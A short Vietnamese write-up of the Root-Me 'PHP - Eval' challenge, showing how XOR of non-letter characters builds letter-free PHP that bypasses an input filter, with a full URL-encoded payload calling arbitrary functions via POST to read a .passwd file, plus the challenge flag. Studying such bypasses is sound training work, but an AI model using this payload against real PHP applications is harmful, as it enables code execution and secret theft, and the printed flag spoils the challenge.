# [PHP - Eval](https://www.root-me.org/en/Challenges/Web-Server/PHP-Eval)

## Solutions

Input không được chứa chữ cái, nhưng 2 kí tự không phải chữ cái xor lại với nhau ra chữ cái thì có thể:

- "POST" == ("~"^".").("~"^"1").("~"^"-").("~"^"*")

Lợi dụng tính năng này, có thể viết được php code truyền vào hàm eval.

Để không phải encode nhiều, chỉ cần encode một số biến mà giá trị của nó ta có thể truyền qua request:

- $_ = "]" ^ ";"; <=> "f"
- $__ = "." ^ "^"; <=> "p"
- $___ = "_".("~"^".").("~"^"1").("~"^"-").("~"^"*"); <=> "_POST"
- `${$___}[$_](${$___}[$__])`; <=> "`$_POST["f"]($_POST["p"])`"

=> Ghép tất cả lại: `${"_".("~"^".").("~"^"1").("~"^"-").("~"^"*")}["]" ^ ";"](${"_".("~"^".").("~"^"1").("~"^"-").("~"^"*")}["." ^ "^"])`

Ở POST body, để thực thi lệnh ta chỉ cần để f = tên hàm và q là parameter:

```http
input=%24%7b%22_%22.(%22~%22%5e%22.%22).(%22~%22%5e%221%22).(%22~%22%5e%22-%22).(%22~%22%5e%22*%22)%7d%5b%22%5d%22%20%5e%20%22%3b%22%5d(%24%7b%22_%22.(%22~%22%5e%22.%22).(%22~%22%5e%221%22).(%22~%22%5e%22-%22).(%22~%22%5e%22*%22)%7d%5b%22.%22%20%5e%20%22%5e%22%5d)&f=file_get_contents&p=.passwd
```

=> nội dung file passwd sẽ được đọc và truyền vào hàm print đã có sẵn ở source code.

Kết quả: `M!xIng_PHP_w1th_3v4l_L0L`

## Fails

- encode string `echo` hoặc `print` để thực thi thì bị lỗi `Call to undefined function`

## References

- <https://www.defenxor.com/blog/writing-simple-php-non-alphanumeric-backdoor-to-evade-waf/>
